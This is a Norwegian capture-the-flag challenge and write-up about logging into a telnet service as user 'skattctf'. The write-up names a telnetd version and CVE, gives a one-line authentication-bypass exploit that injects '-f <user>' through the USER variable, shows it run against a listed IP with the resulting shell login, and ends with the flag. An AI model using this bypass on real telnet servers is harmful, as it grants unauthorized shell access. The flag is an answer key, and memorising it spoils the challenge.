# Telnet

Kan du logge på med telnet som brukeren `skattctf`? 
Brute-force er ikke nødvendig. 

Oppgaven fungerer best fra en Linux-maskin.

<b>Hostingen er dessverre litt ustabil.</b> Lag en Ticket på Discord om du mener at din løsning burde fungere.

```
telnet 13.49.241.86 23023
```

[⬇️ Dockerfile](./Dockerfile)

# Writeup

Dockerfilen hardkoder `inetutils-telnetd=2:2.0-1+deb11u2`. Når en CTF-docker hardkoder versjonsnummer er det verdt å titte på. Her er det [CVE-2026-24061](https://www.offsec.com/blog/cve-2026-24061) som skal utnyttes. Exploiten er så enkel som å kjøre:
```
USER='-f bruker' telnet -a <ipaddr>
```

For å få en telnet-klient som oppfører seg slik GNU InetUtils telnetd vil er det enklest å bruke samme docker-image som serveren. BSD-basert telnet-klient på f.eks. MacOS vil ikke virke. 

```
: haxbox:~; docker run --rm -it debian:11-slim /bin/bash -c \
  "apt-get update && apt-get install -y --no-install-recommends telnet && USER='-f skattctf' telnet -a 13.49.241.86 23023"
...
Connected to 13.49.241.86.
Escape character is '^]'.

Linux 6.1.161-183.298.amzn2023.x86_64 (0493d2bdce10) (pts/0)

Linux 0493d2bdce10 6.1.161-183.298.amzn2023.x86_64 #1 SMP PREEMPT_DYNAMIC Tue Jan 27 05:01:22 UTC 2026 x86_64

Last login: Tue Mar 10 08:16:07 UTC 2026 from fwa5d53-246.bb.online.no on pts/0

   __________________________________
  <   skatt{teln3t_ask3d_wh0_i_am}   >
   ----------------------------------
          \
           \
            .--.
           |o_o |
           |:_/ |
          //   \ \
         (|     | )
        /'\_   _/`\
        \___)=(___/
```

# Flag

```
skatt{teln3t_ask3d_wh0_i_am}
```